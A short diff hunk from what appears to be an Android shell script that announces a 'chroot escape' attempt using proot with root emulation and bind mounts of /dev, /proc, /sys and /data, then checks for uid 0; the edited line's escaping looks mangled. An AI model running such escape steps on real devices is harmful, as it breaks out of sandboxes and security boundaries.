@@ -336,7 +336,7 @@ fi
 echo "[*] Attempting chroot escape..."
 if command -v proot >/dev/null 2>&1; then
     # Use proot to access host filesystem
-    proot -0 -r / -b /dev -b /proc -b /sys -b /data -w /data/local/tmp \\
+    proot -0 -r / -b /dev -b /proc -b /sys -b /data -w /data/local/tmp \\\$
         /bin/sh -c "
             echo '[+] Inside proot environment'
             if [ \$(id -u) -eq 0 ]; then
